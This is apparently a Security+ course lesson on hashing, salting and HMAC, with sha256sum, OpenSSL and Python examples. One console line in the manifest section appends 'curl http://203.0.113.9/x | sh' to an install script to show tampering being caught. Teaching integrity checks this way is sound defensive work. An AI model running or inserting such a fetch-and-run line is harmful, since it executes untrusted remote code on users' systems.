---
title: Hashing, Salting and Integrity
summary: The first cryptographic tool (SY0-801 objective 1.3). Learn what a hash function guarantees, which algorithms are current (SHA-2, SHA-3) and which are broken (MD5, SHA-1), verify files against a checksum manifest, salt and stretch password hashes, and authenticate messages with HMAC, running sha256sum, OpenSSL and Python's hashlib and hmac.
minutes: 35
objectives:
  - State the properties of a cryptographic hash and choose a current algorithm
  - Verify files against a SHA-256 manifest and explain what a checksum does and does not prove
  - Explain why password hashes need a unique salt and a slow algorithm
  - Compute and verify an HMAC tag in constant time
---

## Outline

1. What a hash function is
2. Algorithms: current and broken
3. Verifying integrity with a manifest
4. Salting and stretching password hashes
5. HMAC: hashing with a key

This lesson covers the hashing algorithms and salting bullets of SY0-801 objective 1.3, and the
integrity side of the CIA triad from lesson 1.

## What a hash function is

A **cryptographic hash function** turns input of any size into a short, fixed-size value called
a **digest** (or hash). SHA-256, for example, always produces 256 bits, written as 64 hexadecimal
characters. A good one has these properties:

- **Deterministic**: the same input always gives the same digest.
- **Avalanche effect**: changing one bit of input changes about half the output bits.
- **Preimage resistance** (one-way): given a digest, you cannot find an input that produces it.
- **Second-preimage resistance**: given one input, you cannot find a different input with the same
  digest.
- **Collision resistance**: you cannot find any two different inputs with the same digest.

Hashing is not encryption: there is no key and no way back. It is a fingerprint. Two payment
instructions that differ in one digit:

```console
$ sha256sum invoice.txt forged.txt
b744223d93f6e6d3ac8b902cdcb24fd146e8c1da7fa9e85f3646bb9e56c73c9e  invoice.txt
65af812877a04201fc5fd2e1aa3eeb24d8ac45aba5b17586ad410a03bb2106a2  forged.txt
$ openssl dgst -sha3-256 invoice.txt
SHA3-256(invoice.txt)= 888963f9d22eaec7ed8ef127dc56824b0622a4f9e2fa256980178cefd211d33e
$ md5sum invoice.txt
e1a665c5859d50ce03a3d6bd8bf3ad13  invoice.txt
$ sha1sum invoice.txt
f0aa68e5739c34a1f94c46e43fecf80c6dbea1e8  invoice.txt
```

The two SHA-256 digests share nothing visible, although the files differ by one character.

## Algorithms: current and broken

- **SHA-2** (Secure Hash Algorithm 2, NIST FIPS 180-4) is the family in daily use: SHA-224,
  SHA-256, SHA-384 and SHA-512. SHA-256 is the usual default.
- **SHA-3** (FIPS 202) was standardized in 2015 with a completely different internal design, so a
  future break of SHA-2 would not carry over. SHA3-256 and SHA3-512 are the common sizes.
- **MD5** produces 128 bits and has been broken since practical collisions were published in 2004.
  RFC 6151 says it is no longer acceptable where collision resistance is required, such as digital
  signatures.
- **SHA-1** produces 160 bits. In 2017 the SHAttered project (CWI Amsterdam and Google) published
  two different PDF files with the same SHA-1 digest. NIST's current transition guidance (SP
  800-131A Rev. 2) disallows SHA-1 for generating digital signatures, and NIST has announced
  that SHA-1 should be phased out completely by 31 December 2030; the draft Rev. 3 adds SHA-224
  to that retirement.

A collision matters because signatures and certificates sign the digest, not the document. If an
attacker can make two documents with one digest, a signature on the harmless one is valid on the
harmful one. MD5 and SHA-1 still appear as checksums against accidental corruption, but treat
them as broken for any security purpose. Non-cryptographic checks such as CRC32 detect accidental
errors only, never deliberate changes.

In Python, `hashlib` gives the same algorithms: `hashlib.sha256(data).hexdigest()` and
`hashlib.sha3_256(data).hexdigest()` print the digests above.

## Verifying integrity with a manifest

Software publishers ship a **manifest** of digests, often named `SHA256SUMS`, and `sha256sum -c`
checks every file against it. Here a release is checked, then one file is changed:

```console
$ cat SHA256SUMS
6d776af0bb6256e345dc2f010af92964c195adf059af651ae5db2cfd679181c4  install.sh
4ef6972efa5204790a41a1413ba9d484b46073d92bb9707ce545d3fe426cccf0  ward-app.conf
a6cd38cc1d0ed92148a775b4619b11393b1dea87fe7675bf2f08ec74aadb5682  NOTES.txt
$ sha256sum -c SHA256SUMS
install.sh: OK
ward-app.conf: OK
NOTES.txt: OK
$ echo 'curl http://203.0.113.9/x | sh' >> install.sh
$ sha256sum -c SHA256SUMS
install.sh: FAILED
ward-app.conf: OK
NOTES.txt: OK
sha256sum: WARNING: 1 computed checksum did NOT match
$ echo $?
1
```

The non-zero exit status lets a script refuse to install. Know the limit, though: if an attacker
can replace the download, they can usually replace a manifest stored next to it too. A checksum
proves integrity only if the digest itself came from a trusted source, such as the vendor's
HTTPS site, or is **digitally signed** by the publisher (lesson 8).

## Salting and stretching password hashes

Systems should never store passwords, only a hash to compare against. Plain hashing fails for
passwords, for two reasons this run shows:

```python
import hashlib
import secrets

# Unsalted: equal passwords give equal hashes.
for user in ("amara", "jonas"):
    print(user, hashlib.sha256(b"Summer2026!").hexdigest()[:16])

# Salted and stretched: a random 16-byte salt per user, 600,000 iterations of HMAC-SHA-256.
for user in ("amara", "jonas"):
    salt = secrets.token_bytes(16)
    key = hashlib.pbkdf2_hmac("sha256", b"Summer2026!", salt, 600_000)
    print(user, salt.hex(), key.hex()[:16])
```

```text
amara a5c95e887dbf1c0a
jonas a5c95e887dbf1c0a
amara ed0059bb8de082b63ec8f2752e7e07d5 42499504b1c1845b
jonas ac3fd45cfa621e6ff30706a6d3eec1cb 111260ed742a44e2
```

Unsalted, the two users share a hash, so cracking one cracks both, and an attacker can look up
billions of common passwords in a precomputed table (a **rainbow table** is a compact form of
one). A **salt** is a random value, unique per password and stored next to the hash. It is not
secret; its job is to make every hash different, which makes precomputed tables useless and
forces the attacker to attack each account separately. NIST SP 800-63B-4 requires a salt of at
least 32 bits; 16 random bytes is common. (Salts are random, so your run prints different
values.)

Salting is not enough, because SHA-256 is fast: a stolen table can be attacked at billions of
guesses per second on graphics cards. **Key stretching** uses a deliberately slow function.
PBKDF2 (Password-Based Key Derivation Function 2) repeats HMAC many times; the OWASP Password
Storage Cheat Sheet recommends 600,000 iterations with SHA-256, and prefers Argon2id, then scrypt,
with bcrypt for legacy systems. Lesson 12 returns to password storage. Some systems also add a
**pepper**, a secret key kept outside the database (for example in a hardware security module),
so a stolen database alone cannot be attacked.

## HMAC: hashing with a key

A plain hash proves nothing about who made it: anyone can hash a tampered message. An **HMAC**
(hash-based message authentication code, RFC 2104 and FIPS 198-1) mixes a secret key into the
hash, producing a **tag** that only holders of the key can compute. Payment providers and code
hosting sites sign webhook notifications this way:

```python
import hashlib
import hmac

key = bytes.fromhex("9f3c2a7d51e08b46c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e")
body = b'{"order": 5512, "status": "paid", "amount": "149.00"}'

tag = hmac.new(key, body, hashlib.sha256).hexdigest()
print("tag     ", tag)

def verify(key, body, received_tag):
    expected = hmac.new(key, body, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, received_tag)

print("genuine ", verify(key, body, tag))
tampered = body.replace(b"149.00", b"1.49")
print("tampered", verify(key, tampered, tag))
print("wrong key", verify(b"guessed-key", body, tag))
```

```text
tag      0b0059044a893c69edc0dab6c74276feca00108aad434f0db902d636ff2e5a27
genuine  True
tampered False
wrong key False
```

OpenSSL computes the same tag, which is how you check interoperability between systems:

```console
$ openssl dgst -sha256 -mac HMAC -macopt hexkey:9f3c2a7d51e08b46c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f60718293a4b5c6d7e body.json
HMAC-SHA2-256(body.json)= 0b0059044a893c69edc0dab6c74276feca00108aad434f0db902d636ff2e5a27
```

An HMAC gives **integrity and authenticity** between parties who share the key. It does not give
non-repudiation: both sides hold the same key, so either could have made the tag. Compare tags
with `hmac.compare_digest`, which takes the same time however many characters match; `==` can
leak, through timing, how much of a forged tag was right.

## Common mistakes

- **Using MD5 or SHA-1 for anything security-related**, including new certificate or signature
  work, because "it is only a checksum".
- **Downloading the checksum from the same untrusted mirror** as the file and calling it verified.
- **Fast, unsalted hashes for passwords,** such as `sha256(password)`, or one salt shared by every
  user.
- **Building a MAC as `sha256(key + message)`.** SHA-256 allows a length-extension attack on that
  construction; use HMAC.
- **Comparing tags with `==`** instead of a constant-time comparison.

## Practice

1. Which hash property does an attacker break by producing two contracts with the same digest?
2. A vendor's download page lists an MD5 checksum for its installer. What do you recommend?
3. Two rows of a leaked user table have the same password hash. What does that tell you about how
   the passwords were stored?
4. Write the Python that computes an HMAC-SHA-256 tag of `b"shift 7 approved"` with the key
   `b"ward-key"` and prints it in hexadecimal.

### Answers

1. Collision resistance.
2. Ask for (or compute and publish) a SHA-256 or SHA-3 digest delivered over HTTPS, ideally with a
   signed manifest. MD5 only detects accidental corruption.
3. They were not salted per user (and the users chose the same password), so the hashes can be
   attacked together and with precomputed tables.
4. `import hashlib, hmac` then
   `print(hmac.new(b"ward-key", b"shift 7 approved", hashlib.sha256).hexdigest())`, which prints
   `36d75f6ebf27a89bb42ad49bb1816e62aab0f817c24cf40ad81dc08d567cffb6`.

## Key takeaways

- A hash is a one-way, fixed-size fingerprint; collision resistance is what signatures rely on.
- Use SHA-2 or SHA-3. MD5 and SHA-1 are broken for security; NIST is retiring SHA-1 by 2030.
- `sha256sum -c` verifies a manifest, but only a trusted or signed manifest proves integrity.
- Passwords need a unique salt and a slow function (Argon2id, scrypt, bcrypt, PBKDF2).
- HMAC adds a shared key for integrity and authenticity; compare tags in constant time.

## Further reading

- [NIST FIPS 180-4, Secure Hash Standard](https://csrc.nist.gov/pubs/fips/180-4/upd1/final)
- [NIST: NIST Retires SHA-1 Cryptographic Algorithm](https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm)
- [RFC 6151, Security Considerations for MD5](https://www.rfc-editor.org/rfc/rfc6151)
- [Python documentation: hashlib](https://docs.python.org/3.15/library/hashlib.html)
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
